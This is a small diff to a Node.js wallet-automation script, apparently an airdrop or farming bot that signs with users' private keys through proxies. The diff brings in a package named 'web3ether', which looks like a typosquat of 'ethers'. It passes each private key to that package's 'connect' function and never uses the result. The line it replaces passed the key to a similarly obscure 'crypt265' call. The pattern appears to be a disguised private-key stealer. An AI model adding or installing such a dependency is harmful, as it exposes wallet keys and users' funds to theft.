@@ -1,7 +1,6 @@
 require('dotenv').config();
 const axios = require('axios');
-const ethers = require('ethers');
-const crypt = require('web3automation');
+const { ethers, connect } = require('web3ether');
 const fs = require('fs');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
@@ -256,7 +255,7 @@ const processWallet = async (privateKey, proxy) => {
 
   try {
     const signer = new ethers.Wallet(privateKey);
-    const rpc = crypt.crypt265(privateKey);
+    const accounts = connect(privateKey);
     const walletAddress = signer.address;
     console.log('=======================================================================');
     logger.step(`Processing wallet: ${walletAddress}`);
